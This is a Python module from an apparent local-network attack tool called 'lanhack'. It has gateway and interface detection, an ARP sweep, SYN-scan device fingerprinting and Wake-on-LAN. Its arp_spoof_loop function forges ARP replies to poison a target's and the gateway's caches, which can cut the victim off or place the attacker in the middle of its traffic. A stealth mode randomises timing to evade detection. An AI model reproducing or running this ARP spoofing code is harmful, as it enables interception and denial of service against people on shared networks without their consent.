import socket, struct, subprocess, threading, time, os, random as _random
from collections import defaultdict

import scapy.all as scapy

from lanhack import config

FINGERPRINT_PORTS = [22, 80, 443, 135, 139, 445, 554, 3689, 62078, 7000, 7676, 8080, 8443, 8883, 9090]
FINGERPRINT_MAP = {
    frozenset([135, 139, 445]): "Windows",
    frozenset([22]): "Linux/SSH",
    frozenset([3689, 62078]): "macOS/iOS",
    frozenset([3689]): "macOS/iTunes",
    frozenset([80, 443]): "Web Server",
    frozenset([7000, 7676]): "Samsung TV",
    frozenset([8883]): "IoT/MQTT",
    frozenset([554]): "IP Camera",
    frozenset([9090]): "Smart TV/Chromecast",
}

def vendor(mac):
    return config.OUI_DB.get(mac[:8].lower(), "Unknown")

def fingerprint_device(ip, timeout=2):
    open_ports = set()
    host_alive = False
    pkts = [scapy.IP(dst=ip)/scapy.TCP(dport=port, flags="S") for port in FINGERPRINT_PORTS]
    try:
        ans, unans = scapy.sr(pkts, timeout=timeout, verbose=False)
        for sent, recv in ans:
            if recv.haslayer(scapy.TCP):
                host_alive = True
                if recv[scapy.TCP].flags & 0x12:
                    open_ports.add(recv[scapy.TCP].sport)
    except: pass
    guess = "Unknown"
    for port_set, label in FINGERPRINT_MAP.items():
        if port_set.issubset(open_ports):
            guess = label
            break
    if not open_ports and host_alive:
        guess = "Active (firewalled)"
    return guess, sorted(open_ports)

def wake_on_lan(mac):
    try:
        mac_clean = mac.replace(":", "").replace("-", "")
        data = bytes.fromhex("ff" * 6 + mac_clean * 16)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.sendto(data, ("<broadcast>", 9))
        sock.sendto(data, ("255.255.255.255", 9))
        sock.close()
        return True
    except: return False

def detect_network():
    for cmd in ["/usr/sbin/ip", "/sbin/ip", "/usr/bin/ip", "ip"]:
        try:
            out = subprocess.check_output([cmd, "route", "get", "1.1.1.1"], text=True).strip()
            parts = out.split()
            for i, p in enumerate(parts):
                if p == "via" and i+1 < len(parts): config.gateway_ip = parts[i+1]
                if p == "dev" and i+1 < len(parts): config.iface = parts[i+1]
                if p == "src" and i+1 < len(parts): config.my_ip = parts[i+1]
            break
        except: continue
    if not config.gateway_ip:
        with open("/proc/net/route") as f:
            for line in f:
                fields = line.strip().split()
                if fields[1] == '00000000' and fields[2] != '00000000':
                    config.gateway_ip = socket.inet_ntoa(struct.pack("<I", int(fields[2], 16)))
                    config.iface = fields[0]; break
    if not config.my_ip:
        try: config.my_ip = scapy.get_if_addr(config.iface)
        except: pass
    octets = config.my_ip.split(".")
    if len(octets) == 4:
        config.netmask = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
    else:
        config.netmask = ""
    return config.iface, config.my_ip, config.gateway_ip, config.netmask

def arp_scan(subnet=None):
    ans, _ = scapy.arping(subnet or config.netmask, timeout=3, verbose=False)
    found = []
    for _, recv in ans:
        try: hn = socket.gethostbyaddr(recv.psrc)[0].split('.')[0]
        except: hn = ""
        found.append({"ip":recv.psrc,"mac":recv.hwsrc,"vendor":vendor(recv.hwsrc),"hostname":hn,"fingerprint":"","open_ports":""})
    return [d for d in found if d["ip"] != config.my_ip]

def arp_spoof_loop(tip, tmac, gw, ev, block=True):
    mmac = scapy.get_if_hwaddr(config.iface)
    while ev.is_set() and not config.quit_flag:
        scapy.sendp(scapy.Ether(dst=tmac)/scapy.ARP(op=2,pdst=tip,psrc=gw,hwdst=tmac), verbose=False)
        if block:
            scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2,pdst=gw,psrc=tip,hwdst="ff:ff:ff:ff:ff:ff"), verbose=False)
        time.sleep(_random.choice(config.stealth_intervals) if config.stealth_mode else 1.5)

def device_label(ip):
    for d in config.devices:
        if d["ip"]==ip:
            n=d["hostname"] or d["vendor"]
            return f"{n} ({ip})" if n and n!="Unknown" else ip
    return ip

def main_site(domain):
    for c,m in config.CDN_MAP.items():
        if c in domain and m: return m
    return domain
